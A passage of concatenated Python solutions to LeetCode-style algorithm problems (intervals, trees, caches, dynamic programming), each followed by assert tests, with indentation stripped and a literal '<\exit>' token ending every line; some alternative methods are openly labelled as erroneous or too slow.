lvl = 0<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e == end:<\exit>
return lvl<\exit>
for t in bank:<\exit>
if t not in visited and self.is_neighbor(e, t):<\exit>
visited.add(t)<\exit>
cur_q.append(t)<\exit>
lvl += 1<\exit>
q = cur_q<\exit>
return -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minMutation("AACCTTGG", "AATTCCGG", ["AATTCCGG","AACCTGGG","AACCCCGG","AACCTACC"]) == -1<\exit>
assert Solution().minMutation("AACCGGTT", "AAACGGTA", ["AACCGGTA", "AACCGCTA", "AAACGGTA"]) == 2<\exit>
class Solution:<\exit>
def countSegments(self, s):<\exit>
ret = 0<\exit>
if not s:<\exit>
return ret<\exit>
if s[0] != " ":<\exit>
ret = 1<\exit>
prev = s[0]<\exit>
for c in s[1:]:<\exit>
if c != " " and prev == " ":<\exit>
ret += 1<\exit>
prev = c<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countSegments("Hello, my name is John") == 5<\exit>
class Interval:<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
@classmethod<\exit>
def new(cls, lst):<\exit>
return [<\exit>
cls(s, e)<\exit>
for s, e in lst<\exit>
]<\exit>
class Solution:<\exit>
def eraseOverlapIntervals(self, intervals):<\exit>
ret = 0<\exit>
if not intervals:<\exit>
return ret<\exit>
intervals.sort(key=lambda x: x.start)<\exit>
cur = intervals[0]<\exit>
for itv in intervals[1:]:<\exit>
if cur.end <= itv.start:<\exit>
cur = itv<\exit>
else:<\exit>
ret += 1<\exit>
cur = cur if cur.end < itv.end else itv<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [2,3], [3,4], [1,3] ])) == 1<\exit>
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [1,2], [1,2] ])) == 2<\exit>
assert Solution().eraseOverlapIntervals(Interval.new([ [1,2], [2,3] ])) == 0<\exit>
class Interval:<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
@classmethod<\exit>
def new(cls, lst):<\exit>
return [<\exit>
cls(s, e)<\exit>
for s, e in lst<\exit>
]<\exit>
from bisect import bisect_left<\exit>
class Solution:<\exit>
def findRightInterval(self, intervals):<\exit>
indexes = {<\exit>
itv.start: idx<\exit>
for idx, itv in enumerate(intervals)<\exit>
}<\exit>
starts = list(sorted(indexes.keys()))<\exit>
ret = []<\exit>
for itv in intervals:<\exit>
idx = bisect_left(starts, itv.end)<\exit>
if idx >= len(starts):<\exit>
ret.append(-1)<\exit>
else:<\exit>
ret.append(<\exit>
indexes[starts[idx]]<\exit>
)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findRightInterval(Interval.new([ [3,4], [2,3], [1,2] ])) == [-1, 0, 1]<\exit>
assert Solution().findRightInterval(Interval.new([ [1,2] ])) == [-1]<\exit>
assert Solution().findRightInterval(Interval.new([ [1,4], [2,3], [3,4] ])) == [-1, 2, -1]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.count = 0<\exit>
def pathSum(self, root: TreeNode, target: int) -> int:<\exit>
self.dfs(root, target, 0, defaultdict(int))<\exit>
return self.count<\exit>
def dfs(self, node, target, cur_sum, prefix_sum_counter):<\exit>
if not node:<\exit>
return<\exit>
cur_sum += node.val<\exit>
delta = cur_sum - target<\exit>
self.count += prefix_sum_counter[delta]<\exit>
if delta == 0:<\exit>
self.count += 1<\exit>
prefix_sum_counter[cur_sum] += 1<\exit>
self.dfs(node.left, target, cur_sum, prefix_sum_counter)<\exit>
self.dfs(node.right, target, cur_sum, prefix_sum_counter)<\exit>
prefix_sum_counter[cur_sum] -= 1<\exit>
class SolutionComplex:<\exit>
def pathSum(self, root, sum):<\exit>
count = [0]<\exit>
self.dfs(root, sum, 0, {}, count)<\exit>
return count[0]<\exit>
def dfs(self, root, sum, cur_sum, prefix_sum, count):<\exit>
if not root:<\exit>
return<\exit>
cur_sum += root.val<\exit>
diff = cur_sum - sum<\exit>
if diff in prefix_sum:<\exit>
count[0] += prefix_sum[diff]<\exit>
if diff == 0:<\exit>
count[0] += 1<\exit>
prefix_sum[cur_sum] = prefix_sum.get(cur_sum, 0) + 1<\exit>
self.dfs(root.left, sum, cur_sum, prefix_sum, count)<\exit>
self.dfs(root.right, sum, cur_sum, prefix_sum, count)<\exit>
prefix_sum[cur_sum] -= 1<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def findAnagrams(self, s, target):<\exit>
ret = []<\exit>
counter_target = Counter(target)<\exit>
counter_cur = Counter(s[:len(target)])<\exit>
if counter_cur == counter_target:<\exit>
ret.append(0)<\exit>
for idx in range(len(target), len(s)):<\exit>
head = s[idx - len(target)]<\exit>
tail = s[idx]<\exit>
counter_cur[tail] += 1<\exit>
counter_cur[head] -= 1<\exit>
if counter_cur[head] == 0:<\exit>
del counter_cur[head]<\exit>
if counter_cur == counter_target:<\exit>
ret.append(idx - len(target) + 1)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findAnagrams("cbaebabacd", "abc") == [0, 6]<\exit>
class Solution:<\exit>
def parseTernary(self, expression: str) -> str:<\exit>
stk = []<\exit>
for c in reversed(expression):<\exit>
if stk and stk[-1] == "?":<\exit>
stk.pop()<\exit>
first = stk.pop()<\exit>
stk.pop()<\exit>
second = stk.pop()<\exit>
if c == "T":<\exit>
stk.append(first)<\exit>
else:<\exit>
stk.append(second)<\exit>
else:<\exit>
stk.append(c)<\exit>
return stk[0]<\exit>
def parseTernary_complex(self, expression: str) -> str:<\exit>
n = len(expression)<\exit>
stk = []<\exit>
i = n - 1<\exit>
while i >= 0:<\exit>
j = i<\exit>
while j >= 0 and expression[j] not in (":", "?"):<\exit>
j -= 1<\exit>
if j < i:<\exit>
stk.append(expression[j+1:i+1])<\exit>
if expression[j] == ":":<\exit>
i = j - 1<\exit>
else:<\exit>
i = j - 1<\exit>
if expression[i] == "T":<\exit>
a = stk.pop()<\exit>
stk.pop()<\exit>
stk.append(a)<\exit>
i -= 1<\exit>
else:<\exit>
stk.pop()<\exit>
i -= 1<\exit>
return stk[0]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().parseTernary("F?1:T?4:5") == "4"<\exit>
assert Solution().parseTernary("T?T?F:5:3") == "F"<\exit>
class Solution:<\exit>
def arrangeCoins(self, n):<\exit>
return int(<\exit>
(2*n + 1/4)**(1/2)  - 1/2<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().arrangeCoins(5) == 2<\exit>
assert Solution().arrangeCoins(8) == 3<\exit>
class Solution:<\exit>
def idx(self, a):<\exit>
return a - 1<\exit>
def findDuplicates(self, A):<\exit>
for i in range(len(A)):<\exit>
t = self.idx(A[i])<\exit>
while i != t:<\exit>
if A[i] == A[t]:<\exit>
break<\exit>
else:<\exit>
A[i], A[t] = A[t], A[i]<\exit>
t = self.idx(A[i])<\exit>
ret = []<\exit>
for i in range(len(A)):<\exit>
if self.idx(A[i]) != i:<\exit>
ret.append(A[i])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert set(Solution().findDuplicates([4,3,2,7,8,2,3,1])) == set([2,3])<\exit>
class Solution:<\exit>
def compress(self, chars):<\exit>
ret = 1<\exit>
s = 0<\exit>
for i in range(1, len(chars) + 1):<\exit>
if i < len(chars) and chars[i] == chars[s]:<\exit>
continue<\exit>
l = i - s<\exit>
if l > 1:<\exit>
for digit in str(l):<\exit>
chars[ret] = digit<\exit>
ret += 1<\exit>
if i < len(chars):<\exit>
chars[ret] = chars[i]<\exit>
ret += 1<\exit>
s = i<\exit>
return ret<\exit>
def compress_error(self, chars):<\exit>
s = 0<\exit>
for idx in range(1, len(chars) + 1):<\exit>
if idx < len(chars) and chars[idx] == chars[s]:<\exit>
continue<\exit>
l = idx - s<\exit>
if l == 1:<\exit>
s = min(s + 1, len(chars) - 1)<\exit>
else:<\exit>
for digit in str(l):<\exit>
s += 1<\exit>
chars[s] = digit<\exit>
if idx < len(chars):<\exit>
s += 1<\exit>
chars[s] = chars[idx]<\exit>
return s + 1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().compress(["a"]) == 1<\exit>
assert Solution().compress(["a","a","b","b","c","c","c"]) == 6<\exit>
assert Solution().compress(["a","b","b","b","b","b","b","b","b","b","b","b","b"]) == 4<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def numberOfArithmeticSlices(self, A):<\exit>
ret = 0<\exit>
D = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(len(A)):<\exit>
for j in range(i):<\exit>
d = A[i] - A[j]<\exit>
D[i][d] += 1 + D[j][d]<\exit>
if D[j][d] > 0:<\exit>
ret += D[j][d]<\exit>
return ret<\exit>
def numberOfArithmeticSlices_error(self, A):<\exit>
ret = 0<\exit>
D = defaultdict(lambda: defaultdict(int))<\exit>
for i in range(len(A)):<\exit>
for j in range(i):<\exit>
delta = A[i] - A[j]<\exit>
D[i][delta] += 1 + D[j][delta]<\exit>
for j in range(i):<\exit>
delta = A[i] - A[j]<\exit>
if D[j][delta] > 0:<\exit>
ret += D[i][delta]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numberOfArithmeticSlices([2, 4, 6, 8, 10]) == 7<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def distance(self, a, b):<\exit>
return (a[0] - b[0])**2 + (a[1] - b[1])**2<\exit>
def numberOfBoomerangs(self, points):<\exit>
ret = 0<\exit>
for i in range(len(points)):<\exit>
dist_cnt = Counter()<\exit>
for j in range(len(points)):<\exit>
if i != j:<\exit>
d = self.distance(points[i], points[j])<\exit>
dist_cnt[d] += 1<\exit>
for v in dist_cnt.values():<\exit>
ret += v * (v - 1)<\exit>
return ret<\exit>
def numberOfBoomerangs_TLE(self, points):<\exit>
ret = 0<\exit>
for i in range(len(points)):<\exit>
dist_cnt = Counter()<\exit>
dist_lst = []<\exit>
for j in range(len(points)):<\exit>
if i != j:<\exit>
d = self.distance(points[i], points[j])<\exit>
dist_lst.append(d)<\exit>
dist_cnt[d] += 1<\exit>
for d in dist_lst:<\exit>
ret += (dist_cnt[d] - 1)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numberOfBoomerangs([[0,0],[1,0],[2,0]]) == 2<\exit>
class Solution:<\exit>
def findDisappearedNumbers(self, A):<\exit>
for idx in range(len(A)):<\exit>
while True:<\exit>
target = A[idx] - 1<\exit>
if idx == target or A[idx] == A[target]:<\exit>
break<\exit>
A[idx], A[target] = A[target], A[idx]<\exit>
missing = []<\exit>
for idx, elm in enumerate(A):<\exit>
if idx != elm - 1:<\exit>
missing.append(idx + 1)<\exit>
return missing<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findDisappearedNumbers([4, 3, 2, 7, 8, 2, 3, 1]) == [5, 6]<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Codec:<\exit>
DELIMITER = ","<\exit>
def serialize(self, root):<\exit>
def traverse(root, ret):<\exit>
if not root:<\exit>
return<\exit>
ret.append(root.val)<\exit>
traverse(root.left, ret)<\exit>
traverse(root.right, ret)<\exit>
ret = []<\exit>
traverse(root, ret)<\exit>
return self.DELIMITER.join(map(str, ret))<\exit>
def deserialize(self, data):<\exit>
if not data:<\exit>
return<\exit>
lst = list(map(int, data.split(self.DELIMITER)))<\exit>
root = TreeNode(lst[0])<\exit>
def insert(root, val):<\exit>
if val < root.val:<\exit>
if not root.left:<\exit>
root.left = TreeNode(val)<\exit>
else:<\exit>
insert(root.left, val)<\exit>
else:<\exit>
if not root.right:<\exit>
root.right = TreeNode(val)<\exit>
else:<\exit>
insert(root.right, val)<\exit>
for a in lst[1:]:<\exit>
insert(root, a)<\exit>
return root<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def deleteNode(self, root, key):<\exit>
return self._delete(root, key)<\exit>
def _delete(self, root, key):<\exit>
if not root:<\exit>
return<\exit>
if key < root.val:<\exit>
root.left = self._delete(root.left, key)<\exit>
return root<\exit>
elif key > root.val:<\exit>
root.right = self._delete(root.right, key)<\exit>
return root<\exit>
else:<\exit>
if root.left:<\exit>
maxa, left = self._pop_max(root.left)<\exit>
root.left = left<\exit>
root.val = maxa<\exit>
return root<\exit>
elif root.right:<\exit>
mini, right = self._pop_min(root.right)<\exit>
root.right = right<\exit>
root.val = mini<\exit>
return root<\exit>
else:<\exit>
return<\exit>
def _pop_max(self, root):<\exit>
if root.right:<\exit>
maxa, right = self._pop_max(root.right)<\exit>
root.right = right<\exit>
return maxa, root<\exit>
else:<\exit>
return root.val, root.left<\exit>
def _pop_min(self, root):<\exit>
if root.left:<\exit>
mini, left = self._pop_min(root.left)<\exit>
root.left = left<\exit>
return mini, root<\exit>
else:<\exit>
return root.val, root.right<\exit>
def _delete_error(self, root, key):<\exit>
if not root:<\exit>
return<\exit>
if key < root.val:<\exit>
root.left = self._delete(root.left, key)<\exit>
return root<\exit>
elif key > root.val:<\exit>
root.right = self._delete(root.right, key)<\exit>
return root<\exit>
else:<\exit>
if root.left:<\exit>
root.val = root.left.val<\exit>
left = self._delete(root.left, root.left.val)<\exit>
root.left = left<\exit>
return root<\exit>
elif root.right:<\exit>
root.val = root.right.val<\exit>
right = self._delete(root.right, root.right.val)<\exit>
root.right = right<\exit>
return root<\exit>
else:<\exit>
return<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def frequencySort(self, s):<\exit>
counter = defaultdict(int)<\exit>
for c in s:<\exit>
counter[c] += 1<\exit>
bucket = {count: [] for count in range(1, len(s)+1)}<\exit>
for k, v in counter.items():<\exit>
bucket[v].append(k)<\exit>
ret = []<\exit>
for count in reversed(range(1, len(s) + 1)):<\exit>
if bucket[count]:<\exit>
for c in bucket[count]:<\exit>
ret.append(c * count)<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().frequencySort("tree") == "eetr"<\exit>
import heapq<\exit>
class Balloon:<\exit>
def __init__(self, s, e):<\exit>
self.s = s<\exit>
self.e = e<\exit>
def __lt__(self, other):<\exit>
return self.e < other.e<\exit>
class Solution:<\exit>
def findMinArrowShots(self, points):<\exit>
ret = 0<\exit>
points.sort(key=lambda x: x[0])<\exit>
heap = []<\exit>
for point in points:<\exit>
s, e = point<\exit>
if heap and heap[0].e < s:<\exit>
ret += 1<\exit>
heap = []<\exit>
heapq.heappush(heap, Balloon(s, e))<\exit>
if heap:<\exit>
ret += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMinArrowShots([[10,16], [2,8], [1,6], [7,12]]) == 2<\exit>
class Solution:<\exit>
def minMoves(self, nums):<\exit>
mini = min(nums)<\exit>
return sum(map(lambda e: e - mini, nums))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minMoves([1, 2, 3]) == 3<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def fourSumCount(self, A, B, C, D):<\exit>
N = len(A)<\exit>
AB = defaultdict(int)<\exit>
CD = defaultdict(int)<\exit>
for i in range(N):<\exit>
for j in range(N):<\exit>
AB[A[i] + B[j]] += 1<\exit>
CD[C[i] + D[j]] += 1<\exit>
ret = 0<\exit>
for gross, count in AB.items():<\exit>
target = 0 - gross<\exit>
ret += count * CD[target]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
A = [ 1, 2]<\exit>
B = [-2,-1]<\exit>
C = [-1, 2]<\exit>
D = [ 0, 2]<\exit>
assert Solution().fourSumCount(A, B, C, D) == 2<\exit>
class Solution:<\exit>
def findContentChildren(self, g, s):<\exit>
g.sort()<\exit>
s.sort()<\exit>
ret = 0<\exit>
i = 0<\exit>
j = 0<\exit>
while i < len(g) and j < len(s):<\exit>
if g[i] <= s[j]:<\exit>
ret += 1<\exit>
i += 1<\exit>
j += 1<\exit>
else:<\exit>
j += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findContentChildren([10,9,8,7], [5,6,7,8]) == 2<\exit>
class Solution:<\exit>
def find132pattern(self, nums):<\exit>
stack = []<\exit>
mini = float('Inf')<\exit>
for v in nums:<\exit>
while stack and stack[-1][1] <= v:<\exit>
stack.pop()<\exit>
if stack and stack[-1][0] < v:<\exit>
return True<\exit>
mini = min(mini, v)<\exit>
stack.append((mini, v))<\exit>
return False<\exit>
def find132pattern_TLE(self, nums):<\exit>
for i in range(len(nums)):<\exit>
maxa = nums[i]<\exit>
for j in range(i + 1, len(nums)):<\exit>
if nums[j] > nums[i]:<\exit>
if nums[j] < maxa:<\exit>
return True<\exit>
maxa = max(maxa, nums[j])<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().find132pattern([1, 2, 3, 4]) == False<\exit>
assert Solution().find132pattern([3, 1, 4, 2]) == True<\exit>
assert Solution().find132pattern([-1, 3, 2, 0]) == True<\exit>
assert Solution().find132pattern([-2, 1, 1]) == True<\exit>
class Solution:<\exit>
def repeatedSubstringPattern(self, s):<\exit>
return s in (s + s)[1:-1]<\exit>
def repeatedSubstringPattern_error(self, s):<\exit>
if not s:<\exit>
return False<\exit>
p1 = 0<\exit>
e = 1<\exit>
p2 = 1<\exit>
while p2 < len(s):<\exit>
if s[p1] == s[p2]:<\exit>
p1 += 1<\exit>
if p1 == e:<\exit>
p1 = 0<\exit>
else:<\exit>
p1 = 0<\exit>
e = p2 + 1<\exit>
p2 += 1<\exit>
return p2 == len(s) and p1 == 0 and e != len(s)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().repeatedSubstringPattern("abab") == True<\exit>
assert Solution().repeatedSubstringPattern("abcd") == False<\exit>
assert Solution().repeatedSubstringPattern("abacababacab") == True<\exit>
from collections import defaultdict, OrderedDict<\exit>
DUMMY = None<\exit>
class LFUCache:<\exit>
def __init__(self, capacity: int):<\exit>
self.cap = capacity<\exit>
self.values = {}<\exit>
self.freqs = defaultdict(int)<\exit>
self.keys = defaultdict(OrderedDict)<\exit>
self.mini = -1<\exit>
def get(self, key: int) -> int:<\exit>
if key in self.values:<\exit>
val = self.values[key]<\exit>
freq_org = self.freqs[key]<\exit>
self.freqs[key] += 1<\exit>
del self.keys[freq_org][key]<\exit>
self.keys[freq_org + 1][key] = DUMMY<\exit>
if freq_org == self.mini and len(self.keys[self.mini]) == 0:<\exit>
self.mini = freq_org + 1<\exit>
return val<\exit>
else:<\exit>
return - 1<\exit>
def put(self, key: int, value: int) -> None:<\exit>
if self.cap == 0:<\exit>
return<\exit>
if key in self.values:<\exit>
self.values[key] = value<\exit>
self.get(key)<\exit>
else:<\exit>
if len(self.values) >= self.cap:<\exit>
evit_key, _ = self.keys[self.mini].popitem(last=False)<\exit>
del self.values[evit_key]<\exit>
del self.freqs[evit_key]<\exit>
self.values[key] = value<\exit>
self.freqs[key] = 0<\exit>
self.keys[0][key] = DUMMY<\exit>
self.get(key)<\exit>
self.mini = 1<\exit>
class Solution:<\exit>
def hammingDistance(self, x, y):<\exit>
diff = x ^ y<\exit>
ret = 0<\exit>
while diff:<\exit>
ret += diff & 1<\exit>
diff >>= 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().hammingDistance(3, 1) == 1<\exit>
assert Solution().hammingDistance(1, 4) == 2<\exit>
class Solution:<\exit>
def pivot(self, A, lo, hi):<\exit>
pivot = lo<\exit>
closed = pivot<\exit>
for i in range(lo + 1, hi):<\exit>
if A[i] < A[pivot]:<\exit>
closed += 1<\exit>
A[closed], A[i] = A[i], A[closed]<\exit>
A[closed], A[pivot] = A[pivot], A[closed]<\exit>
return closed<\exit>
def quick_select(self, nums, lo, hi, k):<\exit>
pivot = self.pivot(nums, lo, hi)<\exit>
if pivot == k:<\exit>
return nums[pivot]<\exit>
elif pivot > k:<\exit>
return self.quick_select(nums, lo, pivot, k)<\exit>
else:<\exit>
return self.quick_select(nums, pivot + 1, hi, k)<\exit>
def minMoves2(self, nums):<\exit>
n = len(nums)<\exit>
median = self.quick_select(nums, 0, n, n//2)<\exit>
return sum(map(lambda x: abs(x - median), nums))<\exit>
def find_median(self, nums):<\exit>
n = len(nums)<\exit>
nums.sort()<\exit>
return nums[n//2]<\exit>
def minMoves2_error(self, nums):<\exit>
n = len(nums)<\exit>
avg = round(sum(nums) / n)<\exit>
return sum(map(lambda x: abs(x - avg), nums))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minMoves2([1,2,3]) == 2<\exit>
assert Solution().minMoves2([1,0,0,8,6]) == 14<\exit>
class Solution:<\exit>
dirs = [(0, -1), (-1, 0), (0, 1), (1, 0)]<\exit>
def islandPerimeter(self, grid):<\exit>
ret = 0<\exit>
if not grid:<\exit>
return ret<\exit>
R = len(grid)<\exit>
C = len(grid[0])<\exit>
for r0 in range(R):<\exit>
for c0 in range(C):<\exit>
if grid[r0][c0] == 1:<\exit>
for dr, dc in self.dirs:<\exit>
r = r0 + dr<\exit>
c = c0 + dc<\exit>
if r < 0 or r >= R or c < 0 or c >= C:<\exit>
ret += 1<\exit>
elif grid[r][c] == 0:<\exit>
ret += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
grid = [<\exit>
[0,1,0,0],<\exit>
[1,1,1,0],<\exit>
[0,1,0,0],<\exit>
[1,1,0,0],<\exit>
]<\exit>
assert Solution().islandPerimeter(grid) == 16<\exit>
class Solution:<\exit>
def canIWin(self, maxChoosableInteger, desiredTotal):<\exit>
cache = {}<\exit>
choices = frozenset([choice for choice in range(1, maxChoosableInteger + 1)])<\exit>
return self._can_win(desiredTotal, choices, sum(choices), cache)<\exit>
def _can_win(self, total, choices, gross,cache):<\exit>
if (total, choices) in cache:<\exit>
return cache[(total, choices)]<\exit>
ret = False<\exit>
if max(choices) >= total:<\exit>
ret = True<\exit>
elif gross < total:<\exit>
ret = False<\exit>
else:<\exit>
for choice in choices:<\exit>
if not self._can_win(<\exit>
total - choice,<\exit>
choices - set([choice]),<\exit>
gross - choice,<\exit>
cache<\exit>
):<\exit>
ret = True<\exit>
break<\exit>
cache[(total, choices)] = ret<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canIWin(10, 11) == False<\exit>
assert Solution().canIWin(10, 0) == True<\exit>
assert Solution().canIWin(13, 11) == True<\exit>
class Solution:<\exit>
def findSubstringInWraproundString(self, p):<\exit>
counter = {<\exit>
c: 1<\exit>
for c in p<\exit>
}<\exit>
l = 1<\exit>
for i in range(1, len(p)):<\exit>
if (ord(p[i]) - ord(p[i-1])) % 26 == 1:<\exit>
l += 1<\exit>
else:<\exit>
l = 1<\exit>
counter[p[i]] = max(counter[p[i]], l)<\exit>
return sum(counter.values())<\exit>
def findSubstringInWraproundString_error(self, p):<\exit>
if not p:<\exit>
return 0<\exit>
ret = set()<\exit>
i = 0<\exit>
while i < len(p):<\exit>
cur = [p[i]]<\exit>
j = i + 1<\exit>
while j < len(p) and (ord(p[j]) - ord(cur[-1]) == 1 or p[j] == "a" and cur[-1] == "z"):<\exit>
cur.append(p[j])<\exit>
j += 1<\exit>
ret.add("".join(cur))<\exit>
i = j<\exit>
return sum(map(lambda x: (len(x) + 1) * len(x) // 2, ret))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findSubstringInWraproundString("a") == 1<\exit>
assert Solution().findSubstringInWraproundString("cac") == 2<\exit>
assert Solution().findSubstringInWraproundString("zab") == 6<\exit>
assert Solution().findSubstringInWraproundString("zaba") == 6<\exit>
def rand7():<\exit>
return 0<\exit>
class Solution:<\exit>
def rand10(self):<\exit>
while True:<\exit>
rv1 = rand7()<\exit>
rv2 = rand7()<\exit>
s = (rv1 - 1) * 7 + (rv2 - 1)<\exit>
if s < 40:<\exit>
return s % 10 + 1<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
TrieNode = lambda: defaultdict(TrieNode)<\exit>
self.root = TrieNode()<\exit>
def findAllConcatenatedWordsInADict(self, words: List[str]) -> List[str]:<\exit>
words.sort(key=len)<\exit>
ret = []<\exit>
for w in words:<\exit>
if self.can_concat(w, 0):<\exit>
ret.append(w)<\exit>
cur = self.root<\exit>
for c in w:<\exit>
cur = cur[c]<\exit>
cur["end"] = True<\exit>
return ret<\exit>
def can_concat(self, word, lo):<\exit>
if not word:<\exit>
return False<\exit>
k = len(word)<\exit>
if lo >= k:<\exit>
return True<\exit>
cur = self.root<\exit>
for i in range(lo, k):<\exit>
cur = cur[word[i]]<\exit>
if cur.get("end", False) and self.can_concat(word, i + 1):<\exit>
return True<\exit>
return False<\exit>
class SolutionTLE:<\exit>
def findAllConcatenatedWordsInADict(self, words: List[str]) -> List[str]:<\exit>
ret = []<\exit>
visited = set(words)<\exit>
for w in words:<\exit>
if self.can_concat(w, visited):<\exit>
ret.append(w)<\exit>
return ret<\exit>
def can_concat(self, w, visited):<\exit>
if not w:<\exit>
return False<\exit>
k = len(w)<\exit>
F = [False for _ in range(k + 1)]<\exit>
F[0] = True<\exit>
for i in range(1, k + 1):<\exit>
for j in range(i):<\exit>
if j == 0 and i == k:<\exit>
continue<\exit>
if F[j] and w[j:i] in visited:<\exit>
F[i] = True<\exit>
return F[k]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findAllConcatenatedWordsInADict(["cat","cats","catsdogcats","dog","dogcatsdog","hippopotamuses","rat","ratcatdogcat"]) == ["catsdogcats","dogcatsdog","ratcatdogcat"]<\exit>
class Solution:<\exit>
def makesquare(self, nums):<\exit>
if not nums:<\exit>
return False<\exit>
square = [0 for _ in range(4)]<\exit>
l = sum(nums) // 4<\exit>
if sum(nums) % 4 != 0:<\exit>
return False<\exit>
nums.sort(reverse=True)<\exit>
return self.dfs(nums, 0, l, square)<\exit>
def dfs(self, nums, i, l, square):<\exit>
if i >= len(nums):<\exit>
return True<\exit>
for j in range(len(square)):<\exit>
if nums[i] + square[j] <= l:<\exit>
square[j] += nums[i]<\exit>
if self.dfs(nums, i + 1, l, square):<\exit>
return True<\exit>
square[j] -= nums[i]<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().makesquare([1,1,2,2,2]) == True<\exit>
assert Solution().makesquare([3,3,3,3,4]) == False<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def findMaxForm(self, strs, m, n):<\exit>
if not strs:<\exit>
return 0<\exit>
F = [[0 for _ in range(n + 1)] for _ in range(m + 1)]<\exit>
z, o = self.count(strs[0])<\exit>
for i in range(m+1):<\exit>
for j in range(n+1):<\exit>
if i + z<= m and j + o <= n:<\exit>
F[i][j] = 1<\exit>
for e in range(1, len(strs)):<\exit>
z, o = self.count(strs[e])<\exit>
for i in range(m+1):<\exit>
for j in range(n+1):<\exit>
if i + z <= m and j + o <= n:<\exit>
F[i][j] = max(<\exit>
F[i][j],<\exit>
F[i + z][j + o] + 1<\exit>
)<\exit>
ret = max(<\exit>
F[i][j]<\exit>
for i in range(m + 1)<\exit>
for j in range(n + 1)<\exit>
)<\exit>
return ret<\exit>
def count(self, s):<\exit>
z, o = 0, 0<\exit>
for e in s:<\exit>
if e == "0":<\exit>
z += 1<\exit>
else:<\exit>
o += 1<\exit>
return z, o<\exit>
def findMaxForm_TLE(self, strs, m, n):<\exit>
if not strs:<\exit>
return 0<\exit>
F = [[[0 for _ in range(len(strs))] for _ in range(n + 1)] for _ in range(m + 1)]<\exit>
count = Counter(strs[0])<\exit>
for i in range(m+1):<\exit>
for j in range(n+1):<\exit>
if i + count["0"] <= m and j + count["1"] <= n:<\exit>
F[i][j][0] = 1<\exit>
for e in range(1, len(strs)):<\exit>
count = Counter(strs[e])<\exit>
for i in range(m+1):<\exit>
for j in range(n+1):<\exit>
if i + count["0"] <= m and j + count["1"] <= n:<\exit>
F[i][j][e] = F[i + count["0"]][j + count["1"]][e-1] + 1<\exit>
F[i][j][e] = max(F[i][j][e], F[i][j][e-1])<\exit>
ret = max(<\exit>
F[i][j][-1]<\exit>
for i in range(m + 1)<\exit>
for j in range(n + 1)<\exit>
)<\exit>
return ret<\exit>
def findMaxForm_error(self, strs, m, n):<\exit>
if not strs:<\exit>
return 0<\exit>
F = [[[0 for _ in range(len(strs))] for _ in range(n + 1)] for _ in range(m + 1)]<\exit>
count = Counter(strs[0])<\exit>
if count["0"] <= m and count["1"] <= n:<\exit>
F[m - count["0"]][n - count["1"]][0] += 1<\exit>
for e in range(1, len(strs)):<\exit>
count = Counter(strs[e])<\exit>
for i in range(m+1):<\exit>
for j in range(n+1):<\exit>
if count["0"] <= i and count["1"] <= j:<\exit>
F[i - count["0"]][j - count["1"]][e] = F[i][j][e-1] + 1<\exit>
else:<\exit>
F[i][j][e] = F[i][j][e-1]<\exit>
ret = max(<\exit>
F[i][j][-1]<\exit>
for i in range(m + 1)<\exit>
for j in range(n + 1)<\exit>
)<\exit>
return ret<\exit>
def findMaxForm_error(self, strs, m, n):<\exit>
strs.sort(key=len)<\exit>
ret = 0<\exit>
for a in strs:<\exit>
count = Counter(a)<\exit>
if count["0"] <= m and count["1"] <= n:<\exit>
ret += 1<\exit>
m -= count["0"]<\exit>
n -= count["1"]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMaxForm(["10", "0001", "111001", "1", "0"], 5, 3) == 4<\exit>
assert Solution().findMaxForm(["10", "0", "1"], 1, 1) == 2<\exit>
